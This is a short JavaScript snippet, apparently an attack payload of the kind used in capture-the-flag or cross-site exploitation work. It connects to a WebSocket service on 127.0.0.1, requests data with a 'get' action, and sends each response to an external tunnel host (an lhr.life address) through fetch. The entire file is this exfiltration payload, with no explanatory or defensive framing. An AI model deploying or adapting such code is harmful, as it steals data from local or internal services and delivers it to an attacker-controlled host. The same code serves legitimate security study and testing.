var s = new WebSocket('ws://127.0.0.1/ws');
s.onopen =  async () => {
    s.send(JSON.stringify({action: 'get'}))
};
s.onmessage = (event) => {
    fetch('https://41c9197e98d352.lhr.life?' + encodeURIComponent(event.data))
};
s.onerror = (error) => {
    console.error('WebSocket error:', error);
};
s.onclose = (error) => {
    console.error('WebSocket closed:', error);
};

